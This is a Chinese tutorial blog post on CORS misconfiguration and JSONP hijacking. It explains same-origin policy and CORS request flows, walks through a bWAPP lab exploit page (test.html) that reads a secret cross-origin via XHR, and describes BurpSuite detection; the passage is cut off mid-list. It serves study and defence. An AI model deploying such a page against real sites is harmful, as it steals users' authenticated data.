        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS跨域漏洞与JSONP劫持</title>
    <url>/post/c8aa67d0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前几天逛B站刷到个视频，UP主利用酷某音乐软件存在JSONP劫持漏洞获取了骗子绑定的手机号，于是我便搜集了些网上的资料对JSONP的相关知识点进行一个系统的学习，原视频如下</p>
<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"theme":"#da4e7f","screenshot":true,"video":{"url":"/video/Av637198900.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.png"},"danmaku":{"api":"https://dplayer.alone88.cn/v3/bilibili?cid=554223473","token":"tokendemo","addition":["https://dplayer.alone88.cn/v3/bilibili?cid=554223473"]}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>

<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>CORS全称为Cross-Origin Resource Sharing，即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。而CORS漏洞则是利用CORS技术窃取用户敏感数据。CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p>
<p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
<p>JSONP全称是Json With Padding，是基于JSON格式的为解决跨域请求而产生的解决实现方案。JSONP实现的基本原理是利用了HTML里<code>&lt;script&gt;&lt;/scirpt&gt;</code>元素标签，远程调用JSON文件来实现数据传递。当某网站通过JSONP的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
<p>CORS漏洞、JSONP劫持实际上都属于CSRF跨站请求伪造漏洞，尽管二者已经出现了很多年，但由于部分厂商对此不够重视导致其仍在不断发展和扩散。</p>
<h2 id="1、同源策略"><a href="#1、同源策略" class="headerlink" title="1、同源策略"></a>1、同源策略</h2><p>对 CORS 的介绍要从浏览器的同源策略开始说起，SOP 全称为 Same Origin Policy，即同源策略。该策略是浏览器的一个安全基石，同源策略规定：<strong>不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。</strong></p>
<p>简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。所谓同源是指 <strong>域名，协议，端口相同</strong>。</p>
<h2 id="2、AJAX技术"><a href="#2、AJAX技术" class="headerlink" title="2、AJAX技术"></a>2、AJAX技术</h2><p>跨域问题是针对使用 <code>XMLHttpRequest</code> 技术构建的复杂的、动态的网页的编程实践技术—— AJAX 的，HTML 本身没有跨域问题。</p>
<p>​    AJAX 全称 Asynchronous JavaScript + XML，即异步 JavaScript 和 XML。AJAX 本身不是一种新技术，而是用来描述一种使用现有技术集合/标准的新方法，包括：HTML or XHTML、Cascading Style Sheets、JavaScript、The Document Object Model、XML、XSLT 以及 XMLHttpRequest object。AJAX 允许只更新一个 HTML 页面的部分 DOM，而无须重新加载整个页面， 网页应用能够快速地将增量更新呈现在用户界面上，而不需要重新加载整个页面。这使得程序能够更快地回应用户的操作。</p>
<p>【注意】尽管X在 Ajax 中代表 XML，但由于 JSON 的许多优势，比如更加轻量以及作为 Javascript 的一部分，目前 JSON 的使用比 XML 更加普遍。JSON 和 XML 都被用于在 Ajax 模型中打包信息。</p>
<p>当我们使用 AJAX 技术发送 <code>XMLHttpRequest</code> 请求的时候，如果请求的是别的域 (主机域名、端口) 不同时，那么就会产生跨域问题(受同源策略影响，客户端将无法获取服务端返回的数据，除非使用 CORS 跨域资源共享技术)。值得注意的是：跨域的问题是发生在<code>XMLHttpRequest</code> 请求的，也就是说，不是 <code>XMLHttpRequest</code> 请求是不会有跨域问题的。举个很简单的例子：在编写网页的时候，<code>&lt;img src = www.xxxx.xxxx/ &gt;</code>，在 CORS 跨域资源共享技术的作用下，URL 不是本域的还是可以正常获取该图片的。</p>
<h1 id="二、CORS跨域"><a href="#二、CORS跨域" class="headerlink" title="二、CORS跨域"></a>二、CORS跨域</h1><p>SOP 浏览器同源策略是一个很好的策略，在 SOP 被提出之后，大家都默默地遵守着这个规定，但随着WEB应用的发展，有些网站由于自身业务的需求，需要实现一些跨域的功能能够让不同域的页面之间能够相互访问各自页面的内容。常见需要跨域的业务场景如下：</p>
<ol>
<li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题；</li>
<li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域；</li>
<li>电商网站想通过用户浏览器加载第三方快递网站的物流信息；</li>
<li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li>
</ol>
<p>为了实现这个跨域需求，聪明的程序员想到了一种编码技术 JSONP，该技术利用从客户端传入的 json 格式的返回值，在服务器端调用该接口处事先以定义函数的方式定义好 json 格式里参数值，并加载 script 标签调用该函数实现跨域。 JSONP 虽然好，但它并非是在协议层面解决跨域问题，所以出现了很多安全问题。</p>
<p>​    为了能更安全的进行跨域资源访问，CORS 诞生了。CORS 是 H5 提供的一种机制，<strong>WEB 应用程序可以通过在 HTTP 报文中增加特定字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源。</strong></p>
<h2 id="1、跨域流程"><a href="#1、跨域流程" class="headerlink" title="1、跨域流程"></a>1、跨域流程</h2><p>浏览器将CORS请求分成两类：<strong>简单请求</strong>（simple request）和 <strong>非简单请求</strong>（not-so-simple request）。只要同时满足以下两个条件就属于简单请求否则属于非简单请求（主要通过请求方法进行判断）：</p>
<ol>
<li><p>请求方法是以下三种之一</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
</li>
<li><p>HTTP的头信息不超出以下几种字段。</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Lat-Event-ID</li>
<li>Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain。这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。</li>
</ul>
</li>
</ol>
<h3 id="（1）CORS跨域——简单请求的流程"><a href="#（1）CORS跨域——简单请求的流程" class="headerlink" title="（1）CORS跨域——简单请求的流程"></a>（1）CORS跨域——简单请求的流程</h3><p>对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个<code>Origin</code>的字段，用来表示这次的请求来自哪个域。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span><span class="punctuation">: </span>FooBar</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>上面的头信息之中，有三个与CORS请求相关的字段，都以<code>Access-Control-</code>开头。</p>
<ol>
<li><p><code>Access-Control-Allow-Origin</code>：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大；</p>
</li>
<li><p><code>Access-Control-Allow-Credentials</code>：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送Cookie，删除该字段即可。<strong>但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略，</strong> <strong>只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</strong>  </p>
</li>
<li><p><code>Access-Control-Expose-Headers</code>：该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。  </p>
</li>
</ol>
<p>具体的CORS简单跨域请求流程如下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646812634466-fbf45f2a-b577-47b3-a809-cf238b1ff447.png" alt="img"></p>
<h4 id="withCredentials-属性"><a href="#withCredentials-属性" class="headerlink" title="withCredentials 属性"></a>withCredentials 属性</h4><p>上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>

<p>另一方面，开发者必须在AJAX请求中打开<code>withCredentials</code>属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
<p>但是，如果省略<code>withCredentials</code>设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhr.withCredentials = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<h3 id="（2）CORS跨域——非简单请求的流程"><a href="#（2）CORS跨域——非简单请求的流程" class="headerlink" title="（2）CORS跨域——非简单请求的流程"></a>（2）CORS跨域——非简单请求的流程</h3><p>所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为 PUT 或 DELETE。非简单的 CORS 请求会在正式通信之前，增加一次 HTTP 查询请求，称之为 “预检请求”（preflight） 。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些 HTTP 动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出 <code>XMLHttpRequest</code> 请求，否则就报错。这种请求的好处是对传统的没有 CORS 支持的服务器减小压力，给服务器一个提前拒绝的机会。</p>
<h4 id="①-预检请求"><a href="#①-预检请求" class="headerlink" title="① 预检请求"></a>① 预检请求</h4><p>下面是一段浏览器的JavaScript脚本。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://api.alice.com/cors&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;PUT&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;X-Custom-Header&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>上面代码中，HTTP请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Request-Method</span><span class="punctuation">: </span>PUT</span><br><span class="line"><span class="attribute">Access-Control-Request-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>“预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</p>
<p>除了Origin字段，”预检”请求的头信息包括两个特殊字段。</p>
<p><strong>（1）Access-Control-Request-Method</strong></p>
<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是<code>PUT</code>。</p>
<p><strong>（2）Access-Control-Request-Headers</strong></p>
<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>
<h4 id="②-预检请求的回应"><a href="#②-预检请求的回应" class="headerlink" title="② 预检请求的回应"></a>② 预检请求的回应</h4><p>服务器收到”预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.0.61 (Unix)</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET, POST, PUT</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Keep-Alive</span><span class="punctuation">: </span>timeout=2, max=100</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br></pre></td></tr></table></figure>

<p>上面的HTTP回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<p>如果服务器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpReques</code>t对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XMLHttpRequest cannot load http://api.alice.com.</span><br><span class="line">Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>

<p>服务器回应的其他CORS相关字段如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>GET, POST, PUT</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Custom-Header</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">Access-Control-Max-Age</span><span class="punctuation">: </span>1728000</span><br></pre></td></tr></table></figure>

<p><strong>（1）Access-Control-Allow-Methods</strong></p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p>
<p><strong>（2）Access-Control-Allow-Headers</strong></p>
<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p>
<p><strong>（3）Access-Control-Allow-Credentials</strong></p>
<p>该字段与简单请求时的含义相同。</p>
<p><strong>（4）Access-Control-Max-Age</strong></p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<h4 id="③-浏览器的正常请求和回应"><a href="#③-浏览器的正常请求和回应" class="headerlink" title="③ 浏览器的正常请求和回应"></a>③ 浏览器的正常请求和回应</h4><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>
<p>下面是”预检”请求之后，浏览器的正常CORS请求。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/cors</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.alice.com</span><br><span class="line"><span class="attribute">X-Custom-Header</span><span class="punctuation">: </span>value</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>http://api.bob.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<h4 id="④-总结"><a href="#④-总结" class="headerlink" title="④ 总结"></a>④ 总结</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646812872211-e6632566-ed92-4578-9ccb-d2e5cb8db6a1.png" alt="img"></p>
<p>具体流程如上图所示，当构造请求包的方法是 <code>PUT</code> 或 <code>DELETE</code> 并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是 <code>OPTIONS</code>，并携带三个关键字段：<code>Origin</code>、<code>Access-Control-Request-Method</code>、<code>Access-Control-Request-Headers</code>。其中 <code>Access-Control-Request-Method</code> 表示浏览器的 CORS 请求会用到哪些HTTP方法，<code> Access-Control-Request-Headers</code> 表示浏览器 CORS 请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的 HTTP 回应，并携带传入的 CORS 头信息。如果服务器否定请求，虽然也会返回一个正常的 HTTP 回应但是没有任何 CORS 相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。</p>
<h2 id="2、攻击流程"><a href="#2、攻击流程" class="headerlink" title="2、攻击流程"></a>2、攻击流程</h2><p>CORS 使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如<code>Access-Control-Allow-Origin: *</code>。 CORS 反而使同源策略的保护机制土崩瓦解。<strong>因此，CORS 漏洞的成因很明显，就是服务端配置的规则不当所导致的。</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813290828-38fd21f7-a7f3-4b75-9d1a-cecb131f8af9.png" alt="img">CORS 跨域漏洞的攻击流程如上图所示：</p>
<ol>
<li>假设用户登陆一个含有 CORS 配置网站 vuln.com，同时又访问了攻击者提供的一个链接 evil.com。</li>
<li>evil.com 的网站向 vuln.com 这个网站发起请求获取敏感数据，浏览器能否接收信息取决于 vuln.com 的配置。</li>
<li>如果 vuln.com 配置了 Access-Control-Allow-Origin 头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</li>
</ol>
<h2 id="3、漏洞验证"><a href="#3、漏洞验证" class="headerlink" title="3、漏洞验证"></a>3、漏洞验证</h2><p>这是一个正常的GET请求包</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813526348-9af54a01-710d-479e-94c5-6bc44af06ff3.png" alt="img"></p>
<p>其正常响应包为</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813561060-5ff144c2-1c61-4d8b-b1a0-099b945464fe.png" alt="img"></p>
<p>我们现在在该请求包上面添加一个<code>origin</code>参数</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813615782-2154f5d0-679e-465e-8f14-1d7cc89b8f99.png" alt="img"></p>
<p>返回包的数据中出现了对应的 CORS 响应头：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646813667871-3b7b17c6-01c3-45f3-a715-40ce00edc167.png" alt="img"></p>
<p>其中<code>Access-Control-Allow-Origin</code>指是允许访问的源，<code>Access-Control-Allow-Credentials</code>指的是允许带上 cookie 访问资源，这样我们就可以通过 POST 获取到访问者的 cookie 信息。</p>
<h2 id="4、靶场实例"><a href="#4、靶场实例" class="headerlink" title="4、靶场实例"></a>4、靶场实例</h2><p>以 BWAPP 靶场 Low 级别的 CORS 漏洞环境作为演示案例</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646816293965-79299f24-6895-4687-9bc5-4f72ef554bed.png" alt="img"></p>
<p>点击 secret 跳转到如下页面，藏着 Neo 的秘密：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646816333925-c5fa65f4-5b42-4644-a1c5-4fdf2e941623.png" alt="img"></p>
<p>现在攻击者的目的是盗取该页面里面的 sercet 密码内容，查看请求这个页面时的HTTP响应头，从<code>Access-Control-Allow-Origin：*</code> 头可以看出服务器配置了 CORS，且所有的源服务器都可以加载这个页面上的资源：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646819976754-abccead4-8566-458b-b77b-01cbde59b2ad.png" alt="img"></p>
<p>攻击者可以直接发送一个自己构造的页面链接给用户，当用户点击后，攻击页面使用 ajax 就可以直接读取另一个 BWAPP 靶场网站的目标网页敏感信息，攻击页面 test.html 源码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> xhr =<span class="keyword">new</span> XMLHttpRequest();<span class="comment">// 创建AJAX的对象</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 设置使用的请求方式</span></span></span><br><span class="line"><span class="javascript">            xhr.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://127.0.0.1/bwAPP2.2/bwAPP/secret-cors-1.php&#x27;</span>,<span class="literal">true</span>); </span></span><br><span class="line"><span class="javascript">            xhr.send(); <span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="javascript">            xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> )&#123; <span class="comment">// 状态 4 表示服务器已响应</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// 判断正常的响应结果的状态码</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span>(xhr.status &gt;=<span class="number">200</span> &amp;&amp; xhr.status&lt;<span class="number">300</span> || xhr.status === <span class="number">304</span>)&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(xhr.responseText); <span class="comment">// 获取响应体内容</span></span></span><br><span class="line"><span class="javascript">                    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(<span class="string">&#x27;0&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                    &#125;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此处将该页面放在本地 PhpStudy 搭建的服务下，并在浏览器进行访问，将成功跨域发送资源请求并返回想要的敏感信息（控制台打印）：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820441368-ac57ba92-932d-4303-bcb5-bd1dd21ddf63.png" alt="img"></p>
<p>或者直接使用eval目录下的attack-cors.htm，修改目标服务器路径即可</p>
<h2 id="5、检测方法"><a href="#5、检测方法" class="headerlink" title="5、检测方法"></a>5、检测方法</h2><p>如何在平常测试中检查 CORS 跨域漏洞？</p>
<p>CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。</p>
<p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p>
<p>首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 <code>Origin:foo.example.org</code> 的Enable框：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820689476-f7b1ce2f-d25e-4c80-bd2d-645d84710c48.png" alt="img"></p>
<p>然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820729340-d1b5d3f7-608b-4b9c-9601-e143470bb344.png" alt="img"></p>
<p>我们的条件可以是如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: foo.example.org</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>检测效果如下：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646820805243-4fa8dc01-c9a6-43a0-a511-3cfb5ba17206.png" alt="img"></p>
<p>【<strong>注意</strong>】这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞：</p>
<ol>
<li>实锤存在： 有且仅有如下请求头：</li>
</ol>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>实锤存在：同时存在如下两个请求头</li>
</ol>
